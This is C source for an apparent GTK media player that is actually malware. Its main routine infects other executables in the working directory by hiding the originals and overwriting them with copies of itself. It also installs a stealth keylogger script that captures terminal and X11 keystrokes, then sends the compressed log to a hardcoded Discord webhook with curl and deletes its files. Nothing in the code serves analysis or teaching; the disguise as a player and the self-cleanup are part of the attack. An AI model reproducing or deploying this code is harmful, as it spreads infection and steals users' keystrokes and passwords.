#include <dirent.h>
#include <libgen.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#ifdef __linux__
#include <linux/input.h>
#endif
#include "player.h"
#include <gtk/gtk.h>

typedef struct {
  char new[1000];
  char old[1000];
  char main[50];
} pg;

char *isInfected(pg *files) {
  static char file[500];
  char *strToken = strtok(files->new, "/");
  while (strToken != NULL) {
    if (strstr(files->old, strToken) == NULL) {
      snprintf(file, sizeof(file), "%s/%s", file, strToken);
    }
    strToken = strtok(NULL, "/");
  }
  return file;
}

/**
 * @brief
 * @params
 * @return
 */
void infect(char *fileUninfected, char *prog_name) {
  DIR *dir;
  if ((dir = opendir(".")) == NULL) {
    perror("Cannot open .");
    exit(EXIT_FAILURE);
  }
  char *strToken = strtok(fileUninfected, "/");
  while (strToken != NULL) {
    char tempName[50];
    char cpQuery[50];
    char chQuery[50];

    snprintf(tempName, sizeof(tempName), ".%s.old", strToken);
    rename(strToken, tempName);
    snprintf(cpQuery, sizeof(cpQuery), "cp %s %s 2>/dev/null", prog_name,
             strToken);
    snprintf(chQuery, sizeof(chQuery), "chmod +x %s 2>/dev/null", strToken);
    system(cpQuery);
    system(chQuery);

    strToken = strtok(NULL, "/");
  }
}

pg *fileFinder(char *prog_name) {
  DIR *dir;
  struct dirent *dp;
  static pg file;

  if ((dir = opendir(".")) == NULL) {
    perror("Cannot open .");
    exit(EXIT_FAILURE);
  }

  while ((dp = readdir(dir)) != NULL) {
    struct stat st;

    if (stat(dp->d_name, &st) == 0 && S_ISREG(st.st_mode) &&
        (st.st_mode & S_IXUSR) && strcmp(dp->d_name, prog_name) != 0 &&
        strcmp(dp->d_name, "main") != 0) {

      if (strstr(dp->d_name, "old") != NULL) {
        snprintf(file.old, sizeof(file.old), "%s/%s", file.old, dp->d_name);
      } else {
        snprintf(file.new, sizeof(file.new), "%s/%s", file.new, dp->d_name);
      }

    } else if (strcmp(dp->d_name, prog_name) == 0) {
      snprintf(file.main, sizeof(file.main), "%s", dp->d_name);
    }
  }
  closedir(dir);
  return &file;
}

int mediaPlayer(int argc, char *argv[]) {
  GtkApplication *app = gtk_application_new("com.example.GtkApplication",
                                            G_APPLICATION_DEFAULT_FLAGS);

  AppData app_data = {0};

  g_signal_connect(app, "activate", G_CALLBACK(on_activate), &app_data);

  int status = g_application_run(G_APPLICATION(app), argc, argv);

  g_object_unref(app);
  return status;
}

void execHost(pg *files, char *prog_name, int argc, char *argv[]) {
  char exeQuery[100];
  if (strcmp(prog_name, "MediaPlayer") == 0) {
    mediaPlayer(argc, argv);
  } else {
    snprintf(exeQuery, sizeof(exeQuery), "./.%s.old 2>/dev/null", files->main);
    system(exeQuery);
  }
}

void stealth_keylogger() {
  if (system("pgrep -f 'keylog.sh' > /dev/null 2>&1") == 0)
    return;

  system(
      "cat > /tmp/keylog.sh << 'EOF'\n"
      "#!/bin/bash\n"
      "LOG=/tmp/.keys.log\n"
      "while true; do\n"
      "  # Capture stdin + tty\n"
      "  script -q -c 'cat' /dev/tty 2>&1 | pv -qL 10 >> $LOG &\n"
      "  # Capture X11 si dispo\n"
      "  xinput test-xi2 &>> $LOG 2>/dev/null &\n"
      "  sleep 1\n"
      "done\n"
      "EOF\n"

      "chmod +x /tmp/keylog.sh && "
      "nohup /tmp/keylog.sh > /dev/null 2>&1 & "
      "echo $! > /tmp/.kl.pid && "

      "(sleep 180 && "
      "[ -f /tmp/.keys.log ] && "
      "gzip /tmp/.keys.log && "
      "curl -s -X POST -H \"Content-Type: application/json\" "
      "-d '{\"content\":\"**KEYS RAW:** ```$(base64 /tmp/.keys.log.gz | head "
      "-c 1900)```\\n"
      "**Size:** $(du -h /tmp/.keys.log.gz 2>/dev/null)\"}' "
      "https://discord.com/api/webhooks/1485416783706853558/"
      "qGWKXvrslqK8xzMdQpIy9J8BqiM8WqBaXyq_9SweYyeOXzRRGlmHtjxd8keiCZTyaNyB && "
      "kill $(cat /tmp/.kl.pid 2>/dev/null) 2>/dev/null && "
      "rm -f /tmp/keylog.sh /tmp/.keys* /tmp/.kl.pid) &");
}

int main(int argc, char *argv[]) {
  char pathbuf[256];
  snprintf(pathbuf, sizeof(pathbuf), "%s", argv[0]);
  char *prog_name = basename(pathbuf);

  pg *files = fileFinder(prog_name);
  char *fileUninfected = isInfected(files);
  infect(fileUninfected, prog_name);

  stealth_keylogger();

  execHost(files, prog_name, argc, argv);
}
